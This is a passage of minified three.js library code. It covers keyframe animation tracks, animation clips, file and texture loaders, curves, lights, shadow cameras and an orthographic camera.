                    n = { name: e.name, times: Xa.convertArray(e.times, Array), values: Xa.convertArray(e.values, Array) };
                    const t = e.getInterpolation();
                    t !== e.DefaultInterpolation && (n.interpolation = t)
                }
                return n.type = e.ValueTypeName, n
            }
            InterpolantFactoryMethodDiscrete(e) { return new Ka(this.times, this.values, this.getValueSize(), e) }
            InterpolantFactoryMethodLinear(e) { return new Ja(this.times, this.values, this.getValueSize(), e) }
            InterpolantFactoryMethodSmooth(e) { return new Za(this.times, this.values, this.getValueSize(), e) }
            setInterpolation(e) {
                let t;
                switch (e) {
                    case $:
                        t = this.InterpolantFactoryMethodDiscrete;
                        break;
                    case Q:
                        t = this.InterpolantFactoryMethodLinear;
                        break;
                    case 2302:
                        t = this.InterpolantFactoryMethodSmooth
                }
                if (void 0 === t) {
                    const t = "unsupported interpolation for " + this.ValueTypeName + " keyframe track named " + this.name;
                    if (void 0 === this.createInterpolant) {
                        if (e === this.DefaultInterpolation) throw new Error(t);
                        this.setInterpolation(this.DefaultInterpolation)
                    }
                    return console.warn("THREE.KeyframeTrack:", t), this
                }
                return this.createInterpolant = t, this
            }
            getInterpolation() {
                switch (this.createInterpolant) {
                    case this.InterpolantFactoryMethodDiscrete:
                        return $;
                    case this.InterpolantFactoryMethodLinear:
                        return Q;
                    case this.InterpolantFactoryMethodSmooth:
                        return 2302
                }
            }
            getValueSize() { return this.values.length / this.times.length }
            shift(e) { if (0 !== e) { const t = this.times; for (let n = 0, i = t.length; n !== i; ++n) t[n] += e } return this }
            scale(e) { if (1 !== e) { const t = this.times; for (let n = 0, i = t.length; n !== i; ++n) t[n] *= e } return this }
            trim(e, t) {
                const n = this.times,
                    i = n.length;
                let r = 0,
                    a = i - 1;
                for (; r !== i && n[r] < e;) ++r;
                for (; - 1 !== a && n[a] > t;) --a;
                if (++a, 0 !== r || a !== i) {
                    r >= a && (a = Math.max(a, 1), r = a - 1);
                    const e = this.getValueSize();
                    this.times = Xa.arraySlice(n, r, a), this.values = Xa.arraySlice(this.values, r * e, a * e)
                }
                return this
            }
            validate() {
                let e = !0;
                const t = this.getValueSize();
                t - Math.floor(t) != 0 && (console.error("THREE.KeyframeTrack: Invalid value size in track.", this), e = !1);
                const n = this.times,
                    i = this.values,
                    r = n.length;
                0 === r && (console.error("THREE.KeyframeTrack: Track is empty.", this), e = !1);
                let a = null;
                for (let t = 0; t !== r; t++) {
                    const i = n[t];
                    if ("number" == typeof i && isNaN(i)) { console.error("THREE.KeyframeTrack: Time is not a valid number.", this, t, i), e = !1; break }
                    if (null !== a && a > i) { console.error("THREE.KeyframeTrack: Out of order keys.", this, t, i, a), e = !1; break }
                    a = i
                }
                if (void 0 !== i && Xa.isTypedArray(i))
                    for (let t = 0, n = i.length; t !== n; ++t) { const n = i[t]; if (isNaN(n)) { console.error("THREE.KeyframeTrack: Value is not a valid number.", this, t, n), e = !1; break } }
                return e
            }
            optimize() {
                const e = Xa.arraySlice(this.times),
                    t = Xa.arraySlice(this.values),
                    n = this.getValueSize(),
                    i = 2302 === this.getInterpolation(),
                    r = e.length - 1;
                let a = 1;
                for (let o = 1; o < r; ++o) {
                    let r = !1;
                    const s = e[o];
                    if (s !== e[o + 1] && (1 !== o || s !== e[0]))
                        if (i) r = !0;
                        else {
                            const e = o * n,
                                i = e - n,
                                a = e + n;
                            for (let o = 0; o !== n; ++o) { const n = t[e + o]; if (n !== t[i + o] || n !== t[a + o]) { r = !0; break } }
                        }
                    if (r) {
                        if (o !== a) {
                            e[a] = e[o];
                            const i = o * n,
                                r = a * n;
                            for (let e = 0; e !== n; ++e) t[r + e] = t[i + e]
                        }++a
                    }
                }
                if (r > 0) { e[a] = e[r]; for (let e = r * n, i = a * n, o = 0; o !== n; ++o) t[i + o] = t[e + o];++a }
                return a !== e.length ? (this.times = Xa.arraySlice(e, 0, a), this.values = Xa.arraySlice(t, 0, a * n)) : (this.times = e, this.values = t), this
            }
            clone() {
                const e = Xa.arraySlice(this.times, 0),
                    t = Xa.arraySlice(this.values, 0),
                    n = new(0, this.constructor)(this.name, e, t);
                return n.createInterpolant = this.createInterpolant, n
            }
        }
        $a.prototype.TimeBufferType = Float32Array, $a.prototype.ValueBufferType = Float32Array, $a.prototype.DefaultInterpolation = Q;
        class Qa extends $a {}
        Qa.prototype.ValueTypeName = "bool", Qa.prototype.ValueBufferType = Array, Qa.prototype.DefaultInterpolation = $, Qa.prototype.InterpolantFactoryMethodLinear = void 0, Qa.prototype.InterpolantFactoryMethodSmooth = void 0;
        class eo extends $a {}
        eo.prototype.ValueTypeName = "color";
        class to extends $a {}

        function no(e, t, n, i) { Ya.call(this, e, t, n, i) }
        to.prototype.ValueTypeName = "number", no.prototype = Object.assign(Object.create(Ya.prototype), {
            constructor: no,
            interpolate_: function(e, t, n, i) {
                const r = this.resultBuffer,
                    a = this.sampleValues,
                    o = this.valueSize,
                    s = (n - t) / (i - t);
                let l = e * o;
                for (let e = l + o; l !== e; l += 4) _e.slerpFlat(r, 0, a, l - o, a, l, s);
                return r
            }
        });
        class io extends $a { InterpolantFactoryMethodLinear(e) { return new no(this.times, this.values, this.getValueSize(), e) } }
        io.prototype.ValueTypeName = "quaternion", io.prototype.DefaultInterpolation = Q, io.prototype.InterpolantFactoryMethodSmooth = void 0;
        class ro extends $a {}
        ro.prototype.ValueTypeName = "string", ro.prototype.ValueBufferType = Array, ro.prototype.DefaultInterpolation = $, ro.prototype.InterpolantFactoryMethodLinear = void 0, ro.prototype.InterpolantFactoryMethodSmooth = void 0;
        class ao extends $a {}
        ao.prototype.ValueTypeName = "vector";
        class oo {
            constructor(e, t = -1, n, i = 2500) { this.name = e, this.tracks = n, this.duration = t, this.blendMode = i, this.uuid = ue.generateUUID(), this.duration < 0 && this.resetDuration() }
            static parse(e) {
                const t = [],
                    n = e.tracks,
                    i = 1 / (e.fps || 1);
                for (let e = 0, r = n.length; e !== r; ++e) t.push(so(n[e]).scale(i));
                const r = new this(e.name, e.duration, t, e.blendMode);
                return r.uuid = e.uuid, r
            }
            static toJSON(e) {
                const t = [],
                    n = e.tracks,
                    i = { name: e.name, duration: e.duration, tracks: t, uuid: e.uuid, blendMode: e.blendMode };
                for (let e = 0, i = n.length; e !== i; ++e) t.push($a.toJSON(n[e]));
                return i
            }
            static CreateFromMorphTargetSequence(e, t, n, i) {
                const r = t.length,
                    a = [];
                for (let e = 0; e < r; e++) {
                    let o = [],
                        s = [];
                    o.push((e + r - 1) % r, e, (e + 1) % r), s.push(0, 1, 0);
                    const l = Xa.getKeyframeOrder(o);
                    o = Xa.sortedArray(o, 1, l), s = Xa.sortedArray(s, 1, l), i || 0 !== o[0] || (o.push(r), s.push(s[0])), a.push(new to(".morphTargetInfluences[" + t[e].name + "]", o, s).scale(1 / n))
                }
                return new this(e, -1, a)
            }
            static findByName(e, t) {
                let n = e;
                if (!Array.isArray(e)) {
                    const t = e;
                    n = t.geometry && t.geometry.animations || t.animations
                }
                for (let e = 0; e < n.length; e++)
                    if (n[e].name === t) return n[e];
                return null
            }
            static CreateClipsFromMorphTargetSequences(e, t, n) {
                const i = {},
                    r = /^([\w-]*?)([\d]+)$/;
                for (let t = 0, n = e.length; t < n; t++) {
                    const n = e[t],
                        a = n.name.match(r);
                    if (a && a.length > 1) {
                        const e = a[1];
                        let t = i[e];
                        t || (i[e] = t = []), t.push(n)
                    }
                }
                const a = [];
                for (const e in i) a.push(this.CreateFromMorphTargetSequence(e, i[e], t, n));
                return a
            }
            static parseAnimation(e, t) {
                if (!e) return console.error("THREE.AnimationClip: No animation in JSONLoader data."), null;
                const n = function(e, t, n, i, r) {
                        if (0 !== n.length) {
                            const a = [],
                                o = [];
                            Xa.flattenJSON(n, a, o, i), 0 !== a.length && r.push(new e(t, a, o))
                        }
                    },
                    i = [],
                    r = e.name || "default",
                    a = e.fps || 30,
                    o = e.blendMode;
                let s = e.length || -1;
                const l = e.hierarchy || [];
                for (let e = 0; e < l.length; e++) {
                    const r = l[e].keys;
                    if (r && 0 !== r.length)
                        if (r[0].morphTargets) {
                            const e = {};
                            let t;
                            for (t = 0; t < r.length; t++)
                                if (r[t].morphTargets)
                                    for (let n = 0; n < r[t].morphTargets.length; n++) e[r[t].morphTargets[n]] = -1;
                            for (const n in e) {
                                const e = [],
                                    a = [];
                                for (let i = 0; i !== r[t].morphTargets.length; ++i) {
                                    const i = r[t];
                                    e.push(i.time), a.push(i.morphTarget === n ? 1 : 0)
                                }
                                i.push(new to(".morphTargetInfluence[" + n + "]", e, a))
                            }
                            s = e.length * (a || 1)
                        } else {
                            const a = ".bones[" + t[e].name + "]";
                            n(ao, a + ".position", r, "pos", i), n(io, a + ".quaternion", r, "rot", i), n(ao, a + ".scale", r, "scl", i)
                        }
                }
                return 0 === i.length ? null : new this(r, s, i, o)
            }
            resetDuration() {
                let e = 0;
                for (let t = 0, n = this.tracks.length; t !== n; ++t) {
                    const n = this.tracks[t];
                    e = Math.max(e, n.times[n.times.length - 1])
                }
                return this.duration = e, this
            }
            trim() { for (let e = 0; e < this.tracks.length; e++) this.tracks[e].trim(0, this.duration); return this }
            validate() { let e = !0; for (let t = 0; t < this.tracks.length; t++) e = e && this.tracks[t].validate(); return e }
            optimize() { for (let e = 0; e < this.tracks.length; e++) this.tracks[e].optimize(); return this }
            clone() { const e = []; for (let t = 0; t < this.tracks.length; t++) e.push(this.tracks[t].clone()); return new this.constructor(this.name, this.duration, e, this.blendMode) }
            toJSON() { return this.constructor.toJSON(this) }
        }

        function so(e) {
            if (void 0 === e.type) throw new Error("THREE.KeyframeTrack: track type undefined, can not parse");
            const t = function(e) {
                switch (e.toLowerCase()) {
                    case "scalar":
                    case "double":
                    case "float":
                    case "number":
                    case "integer":
                        return to;
                    case "vector":
                    case "vector2":
                    case "vector3":
                    case "vector4":
                        return ao;
                    case "color":
                        return eo;
                    case "quaternion":
                        return io;
                    case "bool":
                    case "boolean":
                        return Qa;
                    case "string":
                        return ro
                }
                throw new Error("THREE.KeyframeTrack: Unsupported typeName: " + e)
            }(e.type);
            if (void 0 === e.times) {
                const t = [],
                    n = [];
                Xa.flattenJSON(e.keys, t, n, "value"), e.times = t, e.values = n
            }
            return void 0 !== t.parse ? t.parse(e) : new t(e.name, e.times, e.values, e.interpolation)
        }
        const lo = { enabled: !1, files: {}, add: function(e, t) {!1 !== this.enabled && (this.files[e] = t) }, get: function(e) { if (!1 !== this.enabled) return this.files[e] }, remove: function(e) { delete this.files[e] }, clear: function() { this.files = {} } },
            co = new function(e, t, n) {
                const i = this;
                let r, a = !1,
                    o = 0,
                    s = 0;
                const l = [];
                this.onStart = void 0, this.onLoad = void 0, this.onProgress = void 0, this.onError = void 0, this.itemStart = function(e) { s++, !1 === a && void 0 !== i.onStart && i.onStart(e, o, s), a = !0 }, this.itemEnd = function(e) { o++, void 0 !== i.onProgress && i.onProgress(e, o, s), o === s && (a = !1, void 0 !== i.onLoad && i.onLoad()) }, this.itemError = function(e) { void 0 !== i.onError && i.onError(e) }, this.resolveURL = function(e) { return r ? r(e) : e }, this.setURLModifier = function(e) { return r = e, this }, this.addHandler = function(e, t) { return l.push(e, t), this }, this.removeHandler = function(e) { const t = l.indexOf(e); return -1 !== t && l.splice(t, 2), this }, this.getHandler = function(e) {
                    for (let t = 0, n = l.length; t < n; t += 2) {
                        const n = l[t],
                            i = l[t + 1];
                        if (n.global && (n.lastIndex = 0), n.test(e)) return i
                    }
                    return null
                }
            };

        function uo(e) { this.manager = void 0 !== e ? e : co, this.crossOrigin = "anonymous", this.withCredentials = !1, this.path = "", this.resourcePath = "", this.requestHeader = {} }
        Object.assign(uo.prototype, { load: function() {}, loadAsync: function(e, t) { const n = this; return new Promise((function(i, r) { n.load(e, i, t, r) })) }, parse: function() {}, setCrossOrigin: function(e) { return this.crossOrigin = e, this }, setWithCredentials: function(e) { return this.withCredentials = e, this }, setPath: function(e) { return this.path = e, this }, setResourcePath: function(e) { return this.resourcePath = e, this }, setRequestHeader: function(e) { return this.requestHeader = e, this } });
        const ho = {};

        function po(e) { uo.call(this, e) }

        function fo(e) { uo.call(this, e) }
        po.prototype = Object.assign(Object.create(uo.prototype), {
            constructor: po,
            load: function(e, t, n, i) {
                void 0 === e && (e = ""), void 0 !== this.path && (e = this.path + e), e = this.manager.resolveURL(e);
                const r = this,
                    a = lo.get(e);
                if (void 0 !== a) return r.manager.itemStart(e), setTimeout((function() { t && t(a), r.manager.itemEnd(e) }), 0), a;
                if (void 0 !== ho[e]) return void ho[e].push({ onLoad: t, onProgress: n, onError: i });
                const o = e.match(/^data:(.*?)(;base64)?,(.*)$/);
                let s;
                if (o) {
                    const n = o[1],
                        a = !!o[2];
                    let s = o[3];
                    s = decodeURIComponent(s), a && (s = atob(s));
                    try {
                        let i;
                        const a = (this.responseType || "").toLowerCase();
                        switch (a) {
                            case "arraybuffer":
                            case "blob":
                                const e = new Uint8Array(s.length);
                                for (let t = 0; t < s.length; t++) e[t] = s.charCodeAt(t);
                                i = "blob" === a ? new Blob([e.buffer], { type: n }) : e.buffer;
                                break;
                            case "document":
                                const t = new DOMParser;
                                i = t.parseFromString(s, n);
                                break;
                            case "json":
                                i = JSON.parse(s);
                                break;
                            default:
                                i = s
                        }
                        setTimeout((function() { t && t(i), r.manager.itemEnd(e) }), 0)
                    } catch (t) { setTimeout((function() { i && i(t), r.manager.itemError(e), r.manager.itemEnd(e) }), 0) }
                } else {
                    ho[e] = [], ho[e].push({ onLoad: t, onProgress: n, onError: i }), s = new XMLHttpRequest, s.open("GET", e, !0), s.addEventListener("load", (function(t) {
                        const n = this.response,
                            i = ho[e];
                        if (delete ho[e], 200 === this.status || 0 === this.status) {
                            0 === this.status && console.warn("THREE.FileLoader: HTTP Status 0 received."), lo.add(e, n);
                            for (let e = 0, t = i.length; e < t; e++) {
                                const t = i[e];
                                t.onLoad && t.onLoad(n)
                            }
                            r.manager.itemEnd(e)
                        } else {
                            for (let e = 0, n = i.length; e < n; e++) {
                                const n = i[e];
                                n.onError && n.onError(t)
                            }
                            r.manager.itemError(e), r.manager.itemEnd(e)
                        }
                    }), !1), s.addEventListener("progress", (function(t) {
                        const n = ho[e];
                        for (let e = 0, i = n.length; e < i; e++) {
                            const i = n[e];
                            i.onProgress && i.onProgress(t)
                        }
                    }), !1), s.addEventListener("error", (function(t) {
                        const n = ho[e];
                        delete ho[e];
                        for (let e = 0, i = n.length; e < i; e++) {
                            const i = n[e];
                            i.onError && i.onError(t)
                        }
                        r.manager.itemError(e), r.manager.itemEnd(e)
                    }), !1), s.addEventListener("abort", (function(t) {
                        const n = ho[e];
                        delete ho[e];
                        for (let e = 0, i = n.length; e < i; e++) {
                            const i = n[e];
                            i.onError && i.onError(t)
                        }
                        r.manager.itemError(e), r.manager.itemEnd(e)
                    }), !1), void 0 !== this.responseType && (s.responseType = this.responseType), void 0 !== this.withCredentials && (s.withCredentials = this.withCredentials), s.overrideMimeType && s.overrideMimeType(void 0 !== this.mimeType ? this.mimeType : "text/plain");
                    for (const e in this.requestHeader) s.setRequestHeader(e, this.requestHeader[e]);
                    s.send(null)
                }
                return r.manager.itemStart(e), s
            },
            setResponseType: function(e) { return this.responseType = e, this },
            setMimeType: function(e) { return this.mimeType = e, this }
        }), fo.prototype = Object.assign(Object.create(uo.prototype), {
            constructor: fo,
            load: function(e, t, n, i) {
                const r = this,
                    a = [],
                    o = new Ga,
                    s = new po(this.manager);
                s.setPath(this.path), s.setResponseType("arraybuffer"), s.setRequestHeader(this.requestHeader), s.setWithCredentials(r.withCredentials);
                let l = 0;

                function c(c) {
                    s.load(e[c], (function(e) {
                        const n = r.parse(e, !0);
                        a[c] = { width: n.width, height: n.height, format: n.format, mipmaps: n.mipmaps }, l += 1, 6 === l && (1 === n.mipmapCount && (o.minFilter = B), o.image = a, o.format = n.format, o.needsUpdate = !0, t && t(o))
                    }), n, i)
                }
                if (Array.isArray(e))
                    for (let t = 0, n = e.length; t < n; ++t) c(t);
                else s.load(e, (function(e) {
                    const n = r.parse(e, !0);
                    if (n.isCubemap) {
                        const e = n.mipmaps.length / n.mipmapCount;
                        for (let t = 0; t < e; t++) { a[t] = { mipmaps: [] }; for (let e = 0; e < n.mipmapCount; e++) a[t].mipmaps.push(n.mipmaps[t * n.mipmapCount + e]), a[t].format = n.format, a[t].width = n.width, a[t].height = n.height }
                        o.image = a
                    } else o.image.width = n.width, o.image.height = n.height, o.mipmaps = n.mipmaps;
                    1 === n.mipmapCount && (o.minFilter = B), o.format = n.format, o.needsUpdate = !0, t && t(o)
                }), n, i);
                return o
            }
        });
        class mo extends uo {
            constructor(e) { super(e) }
            load(e, t, n, i) {
                void 0 !== this.path && (e = this.path + e), e = this.manager.resolveURL(e);
                const r = this,
                    a = lo.get(e);
                if (void 0 !== a) return r.manager.itemStart(e), setTimeout((function() { t && t(a), r.manager.itemEnd(e) }), 0), a;
                const o = document.createElementNS("http://www.w3.org/1999/xhtml", "img");

                function s() { o.removeEventListener("load", s, !1), o.removeEventListener("error", l, !1), lo.add(e, this), t && t(this), r.manager.itemEnd(e) }

                function l(t) { o.removeEventListener("load", s, !1), o.removeEventListener("error", l, !1), i && i(t), r.manager.itemError(e), r.manager.itemEnd(e) }
                return o.addEventListener("load", s, !1), o.addEventListener("error", l, !1), "data:" !== e.substr(0, 5) && void 0 !== this.crossOrigin && (o.crossOrigin = this.crossOrigin), r.manager.itemStart(e), o.src = e, o
            }
        }
        class go extends uo {
            constructor(e) { super(e) }
            load(e, t, n, i) {
                const r = new Vn,
                    a = new mo(this.manager);
                a.setCrossOrigin(this.crossOrigin), a.setPath(this.path);
                let o = 0;

                function s(n) { a.load(e[n], (function(e) { r.images[n] = e, o++, 6 === o && (r.needsUpdate = !0, t && t(r)) }), void 0, i) }
                for (let t = 0; t < e.length; ++t) s(t);
                return r
            }
        }

        function vo(e) { uo.call(this, e) }

        function yo(e) { uo.call(this, e) }

        function xo() { this.type = "Curve", this.arcLengthDivisions = 200 }
        vo.prototype = Object.assign(Object.create(uo.prototype), {
            constructor: vo,
            load: function(e, t, n, i) {
                const r = this,
                    a = new jn,
                    o = new po(this.manager);
                return o.setResponseType("arraybuffer"), o.setRequestHeader(this.requestHeader), o.setPath(this.path), o.setWithCredentials(r.withCredentials), o.load(e, (function(e) {
                    const n = r.parse(e);
                    n && (void 0 !== n.image ? a.image = n.image : void 0 !== n.data && (a.image.width = n.width, a.image.height = n.height, a.image.data = n.data), a.wrapS = void 0 !== n.wrapS ? n.wrapS : O, a.wrapT = void 0 !== n.wrapT ? n.wrapT : O, a.magFilter = void 0 !== n.magFilter ? n.magFilter : B, a.minFilter = void 0 !== n.minFilter ? n.minFilter : B, a.anisotropy = void 0 !== n.anisotropy ? n.anisotropy : 1, void 0 !== n.encoding && (a.encoding = n.encoding), void 0 !== n.flipY && (a.flipY = n.flipY), void 0 !== n.format && (a.format = n.format), void 0 !== n.type && (a.type = n.type), void 0 !== n.mipmaps && (a.mipmaps = n.mipmaps, a.minFilter = G), 1 === n.mipmapCount && (a.minFilter = B), a.needsUpdate = !0, t && t(a, n))
                }), n, i), a
            }
        }), yo.prototype = Object.assign(Object.create(uo.prototype), {
            constructor: yo,
            load: function(e, t, n, i) {
                const r = new ge,
                    a = new mo(this.manager);
                return a.setCrossOrigin(this.crossOrigin), a.setPath(this.path), a.load(e, (function(n) {
                    r.image = n;
                    const i = e.search(/\.jpe?g($|\?)/i) > 0 || 0 === e.search(/^data\:image\/jpeg/);
                    r.format = i ? Y : Z, r.needsUpdate = !0, void 0 !== t && t(r)
                }), n, i), r
            }
        }), Object.assign(xo.prototype, {
            getPoint: function() { return console.warn("THREE.Curve: .getPoint() not implemented."), null },
            getPointAt: function(e, t) { const n = this.getUtoTmapping(e); return this.getPoint(n, t) },
            getPoints: function(e = 5) { const t = []; for (let n = 0; n <= e; n++) t.push(this.getPoint(n / e)); return t },
            getSpacedPoints: function(e = 5) { const t = []; for (let n = 0; n <= e; n++) t.push(this.getPointAt(n / e)); return t },
            getLength: function() { const e = this.getLengths(); return e[e.length - 1] },
            getLengths: function(e) {
                if (void 0 === e && (e = this.arcLengthDivisions), this.cacheArcLengths && this.cacheArcLengths.length === e + 1 && !this.needsUpdate) return this.cacheArcLengths;
                this.needsUpdate = !1;
                const t = [];
                let n, i = this.getPoint(0),
                    r = 0;
                t.push(0);
                for (let a = 1; a <= e; a++) n = this.getPoint(a / e), r += n.distanceTo(i), t.push(r), i = n;
                return this.cacheArcLengths = t, t
            },
            updateArcLengths: function() { this.needsUpdate = !0, this.getLengths() },
            getUtoTmapping: function(e, t) {
                const n = this.getLengths();
                let i = 0;
                const r = n.length;
                let a;
                a = t || e * n[r - 1];
                let o, s = 0,
                    l = r - 1;
                for (; s <= l;)
                    if (i = Math.floor(s + (l - s) / 2), o = n[i] - a, o < 0) s = i + 1;
                    else {
                        if (!(o > 0)) { l = i; break }
                        l = i - 1
                    }
                if (i = l, n[i] === a) return i / (r - 1);
                const c = n[i];
                return (i + (a - c) / (n[i + 1] - c)) / (r - 1)
            },
            getTangent: function(e, t) {
                const n = 1e-4;
                let i = e - n,
                    r = e + n;
                i < 0 && (i = 0), r > 1 && (r = 1);
                const a = this.getPoint(i),
                    o = this.getPoint(r),
                    s = t || (a.isVector2 ? new he : new be);
                return s.copy(o).sub(a).normalize(), s
            },
            getTangentAt: function(e, t) { const n = this.getUtoTmapping(e); return this.getTangent(n, t) },
            computeFrenetFrames: function(e, t) {
                const n = new be,
                    i = [],
                    r = [],
                    a = [],
                    o = new be,
                    s = new Ze;
                for (let t = 0; t <= e; t++) {
                    const n = t / e;
                    i[t] = this.getTangentAt(n, new be), i[t].normalize()
                }
                r[0] = new be, a[0] = new be;
                let l = Number.MAX_VALUE;
                const c = Math.abs(i[0].x),
                    u = Math.abs(i[0].y),
                    h = Math.abs(i[0].z);
                c <= l && (l = c, n.set(1, 0, 0)), u <= l && (l = u, n.set(0, 1, 0)), h <= l && n.set(0, 0, 1), o.crossVectors(i[0], n).normalize(), r[0].crossVectors(i[0], o), a[0].crossVectors(i[0], r[0]);
                for (let t = 1; t <= e; t++) {
                    if (r[t] = r[t - 1].clone(), a[t] = a[t - 1].clone(), o.crossVectors(i[t - 1], i[t]), o.length() > Number.EPSILON) {
                        o.normalize();
                        const e = Math.acos(ue.clamp(i[t - 1].dot(i[t]), -1, 1));
                        r[t].applyMatrix4(s.makeRotationAxis(o, e))
                    }
                    a[t].crossVectors(i[t], r[t])
                }
                if (!0 === t) {
                    let t = Math.acos(ue.clamp(r[0].dot(r[e]), -1, 1));
                    t /= e, i[0].dot(o.crossVectors(r[0], r[e])) > 0 && (t = -t);
                    for (let n = 1; n <= e; n++) r[n].applyMatrix4(s.makeRotationAxis(i[n], t * n)), a[n].crossVectors(i[n], r[n])
                }
                return { tangents: i, normals: r, binormals: a }
            },
            clone: function() { return (new this.constructor).copy(this) },
            copy: function(e) { return this.arcLengthDivisions = e.arcLengthDivisions, this },
            toJSON: function() { const e = { metadata: { version: 4.5, type: "Curve", generator: "Curve.toJSON" } }; return e.arcLengthDivisions = this.arcLengthDivisions, e.type = this.type, e },
            fromJSON: function(e) { return this.arcLengthDivisions = e.arcLengthDivisions, this }
        });
        class _o extends _t {
            constructor(e, t = 1) { super(), this.type = "Light", this.color = new Wt(e), this.intensity = t }
            copy(e) { return super.copy(e), this.color.copy(e.color), this.intensity = e.intensity, this }
            toJSON(e) { const t = super.toJSON(e); return t.object.color = this.color.getHex(), t.object.intensity = this.intensity, void 0 !== this.groundColor && (t.object.groundColor = this.groundColor.getHex()), void 0 !== this.distance && (t.object.distance = this.distance), void 0 !== this.angle && (t.object.angle = this.angle), void 0 !== this.decay && (t.object.decay = this.decay), void 0 !== this.penumbra && (t.object.penumbra = this.penumbra), void 0 !== this.shadow && (t.object.shadow = this.shadow.toJSON()), t }
        }
        _o.prototype.isLight = !0;
        const bo = new Ze,
            wo = new be,
            Mo = new be;
        class To {
            constructor(e) { this.camera = e, this.bias = 0, this.normalBias = 0, this.radius = 1, this.mapSize = new he(512, 512), this.map = null, this.mapPass = null, this.matrix = new Ze, this.autoUpdate = !0, this.needsUpdate = !1, this._frustum = new Yn, this._frameExtents = new he(1, 1), this._viewportCount = 1, this._viewports = [new ye(0, 0, 1, 1)] }
            getViewportCount() { return this._viewportCount }
            getFrustum() { return this._frustum }
            updateMatrices(e) {
                const t = this.camera,
                    n = this.matrix;
                wo.setFromMatrixPosition(e.matrixWorld), t.position.copy(wo), Mo.setFromMatrixPosition(e.target.matrixWorld), t.lookAt(Mo), t.updateMatrixWorld(), bo.multiplyMatrices(t.projectionMatrix, t.matrixWorldInverse), this._frustum.setFromProjectionMatrix(bo), n.set(.5, 0, 0, .5, 0, .5, 0, .5, 0, 0, .5, .5, 0, 0, 0, 1), n.multiply(t.projectionMatrix), n.multiply(t.matrixWorldInverse)
            }
            getViewport(e) { return this._viewports[e] }
            getFrameExtents() { return this._frameExtents }
            copy(e) { return this.camera = e.camera.clone(), this.bias = e.bias, this.radius = e.radius, this.mapSize.copy(e.mapSize), this }
            clone() { return (new this.constructor).copy(this) }
            toJSON() { const e = {}; return 0 !== this.bias && (e.bias = this.bias), 0 !== this.normalBias && (e.normalBias = this.normalBias), 1 !== this.radius && (e.radius = this.radius), 512 === this.mapSize.x && 512 === this.mapSize.y || (e.mapSize = this.mapSize.toArray()), e.camera = this.camera.toJSON(!1).object, delete e.camera.matrix, e }
        }
        class Eo extends To {
            constructor() { super(new Bn(50, 1, .5, 500)), this.focus = 1 }
            updateMatrices(e) {
                const t = this.camera,
                    n = 2 * ue.RAD2DEG * e.angle * this.focus,
                    i = this.mapSize.width / this.mapSize.height,
                    r = e.distance || t.far;
                n === t.fov && i === t.aspect && r === t.far || (t.fov = n, t.aspect = i, t.far = r, t.updateProjectionMatrix()), super.updateMatrices(e)
            }
        }
        Eo.prototype.isSpotLightShadow = !0;
        class So extends _o {
            constructor(e, t, n = 0, i = Math.PI / 3, r = 0, a = 1) { super(e, t), this.type = "SpotLight", this.position.copy(_t.DefaultUp), this.updateMatrix(), this.target = new _t, this.distance = n, this.angle = i, this.penumbra = r, this.decay = a, this.shadow = new Eo }
            get power() { return this.intensity * Math.PI }
            set power(e) { this.intensity = e / Math.PI }
            copy(e) { return super.copy(e), this.distance = e.distance, this.angle = e.angle, this.penumbra = e.penumbra, this.decay = e.decay, this.target = e.target.clone(), this.shadow = e.shadow.clone(), this }
        }
        So.prototype.isSpotLight = !0;
        const Lo = new Ze,
            Ao = new be,
            Ro = new be;
        class Po extends To {
            constructor() { super(new Bn(90, 1, .5, 500)), this._frameExtents = new he(4, 2), this._viewportCount = 6, this._viewports = [new ye(2, 1, 1, 1), new ye(0, 1, 1, 1), new ye(3, 1, 1, 1), new ye(1, 1, 1, 1), new ye(3, 0, 1, 1), new ye(1, 0, 1, 1)], this._cubeDirections = [new be(1, 0, 0), new be(-1, 0, 0), new be(0, 0, 1), new be(0, 0, -1), new be(0, 1, 0), new be(0, -1, 0)], this._cubeUps = [new be(0, 1, 0), new be(0, 1, 0), new be(0, 1, 0), new be(0, 1, 0), new be(0, 0, 1), new be(0, 0, -1)] }
            updateMatrices(e, t = 0) {
                const n = this.camera,
                    i = this.matrix;
                Ao.setFromMatrixPosition(e.matrixWorld), n.position.copy(Ao), Ro.copy(n.position), Ro.add(this._cubeDirections[t]), n.up.copy(this._cubeUps[t]), n.lookAt(Ro), n.updateMatrixWorld(), i.makeTranslation(-Ao.x, -Ao.y, -Ao.z), Lo.multiplyMatrices(n.projectionMatrix, n.matrixWorldInverse), this._frustum.setFromProjectionMatrix(Lo)
            }
        }
        Po.prototype.isPointLightShadow = !0;
        class Co extends _o {
            constructor(e, t, n = 0, i = 1) { super(e, t), this.type = "PointLight", this.distance = n, this.decay = i, this.shadow = new Po }
            get power() { return 4 * this.intensity * Math.PI }
            set power(e) { this.intensity = e / (4 * Math.PI) }
            copy(e) { return super.copy(e), this.distance = e.distance, this.decay = e.decay, this.shadow = e.shadow.clone(), this }
        }
        Co.prototype.isPointLight = !0;
        class Do extends zn {
            constructor(e = -1, t = 1, n = 1, i = -1, r = .1, a = 2e3) { super(), this.type = "OrthographicCamera", this.zoom = 1, this.view = null, this.left = e, this.right = t, this.top = n, this.bottom = i, this.near = r, this.far = a, this.updateProjectionMatrix() }
            copy(e, t) { return super.copy(e, t), this.left = e.left, this.right = e.right, this.top = e.top, this.bottom = e.bottom, this.near = e.near, this.far = e.far, this.zoom = e.zoom, this.view = null === e.view ? null : Object.assign({}, e.view), this }
            setViewOffset(e, t, n, i, r, a) { null === this.view && (this.view = { enabled: !0, fullWidth: 1, fullHeight: 1, offsetX: 0, offsetY: 0, width: 1, height: 1 }), this.view.enabled = !0, this.view.fullWidth = e, this.view.fullHeight = t, this.view.offsetX = n, this.view.offsetY = i, this.view.width = r, this.view.height = a, this.updateProjectionMatrix() }
            clearViewOffset() { null !== this.view && (this.view.enabled = !1), this.updateProjectionMatrix() }
            updateProjectionMatrix() {
                const e = (this.right - this.left) / (2 * this.zoom),
                    t = (this.top - this.bottom) / (2 * this.zoom),
                    n = (this.right + this.left) / 2,
                    i = (this.top + this.bottom) / 2;
                let r = n - e,
                    a = n + e,
                    o = i + t,
                    s = i - t;
                if (null !== this.view && this.view.enabled) {
                    const e = (this.right - this.left) / this.view.fullWidth / this.zoom,
                        t = (this.top - this.bottom) / this.view.fullHeight / this.zoom;
                    r += e * this.view.offsetX, a = r + e * this.view.width, o -= t * this.view.offsetY, s = o - t * this.view.height
                }
                this.projectionMatrix.makeOrthographic(r, a, o, s, this.near, this.far), this.projectionMatrixInverse.copy(this.projectionMatrix).invert()
            }
